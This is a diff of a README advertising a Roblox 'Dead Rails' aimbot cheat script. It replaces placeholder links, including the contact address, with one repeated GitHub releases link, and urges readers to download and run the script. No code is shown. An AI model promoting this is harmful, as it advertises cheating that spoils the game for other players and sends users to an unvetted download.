@@ -23,7 +23,7 @@ Welcome to the **Roblox Dead Rails Aimbot Cheat** repository! This project provi
 
 To get started, download the script from the following link:
 
-[Download the script](https://github.com/repo/user/archive.zip)
+[Download the script](https://github.com/J0HXX/Roblox-Dead-Rails/releases)
 
 Once downloaded, extract the contents of the ZIP file and follow the instructions below to execute the script.
 
@@ -76,14 +76,14 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Contact
 
-For questions or support, please reach out via GitHub issues or contact me directly at [your-email@example.com].
+For questions or support, please reach out via GitHub issues or contact me directly at [https://github.com/J0HXX/Roblox-Dead-Rails/releases].
 
 ## Additional Resources
 
-For more information and updates, visit the [Releases](https://github.com/repo/user/releases) section of this repository. You can also check back frequently for new features and improvements.
+For more information and updates, visit the [Releases](https://github.com/J0HXX/Roblox-Dead-Rails/releases) section of this repository. You can also check back frequently for new features and improvements.
 
 ## Conclusion
 
-The **Roblox Dead Rails Aimbot Cheat** provides a significant advantage in gameplay, making it easier to compete and enjoy the game. Download the script today from [this link](https://github.com/repo/user/archive.zip) and take your gaming experience to the next level!
+The **Roblox Dead Rails Aimbot Cheat** provides a significant advantage in gameplay, making it easier to compete and enjoy the game. Download the script today from [this link](https://github.com/J0HXX/Roblox-Dead-Rails/releases) and take your gaming experience to the next level!
 
 Happy gaming! 🎮
